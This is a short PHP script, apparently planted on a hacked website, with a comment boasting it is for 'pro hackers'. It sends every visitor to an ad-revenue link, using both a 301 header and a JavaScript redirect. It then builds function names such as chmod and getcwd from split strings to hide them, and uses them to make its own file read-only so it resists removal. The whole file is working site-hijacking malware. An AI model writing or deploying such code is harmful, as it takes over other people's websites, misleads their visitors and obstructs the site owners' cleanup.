<?php
$MY_SELF = $_SERVER['PHP_SELF'];
$THIS_URL = 'https://www.cpmrevenuegate.com/j9a4umrpb5?key=260eef474db86935099d7037a973cda3';
header('Location: '.$THIS_URL, true, 301);
echo '<script>
var baseURL = "'.$THIS_URL.'";
if (window.location.href !== baseURL) {
    window.location.href = baseURL;
}
</script>';

//ghoib (khusu heker pro)
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$cw = "ge" . "tc" . "wd";
$d_name = 'd' . 'ir' . 'na' . 'm' . 'e';
$chperms = 'c'.'h'.'m'.'o'.'d';
$oct = 'o'.'c'.'t'.'d'.'e'.'c';
function NuLzCwd()
{
    global $cw;
    global $func_exist;
    global $d_name;
    if ($func_exist($cw)) {
        return @$cw();
    } else {
        return $d_name($_SERVER["SCRIPT_FILENAME"]);
    }
}

$lokasi = str_replace("\\", "/", NuLzCwd());
$item = $lokasi .'/'. $MY_SELF;
$newPerm = '0444';
$chperms($item, $oct($newPerm));
?>
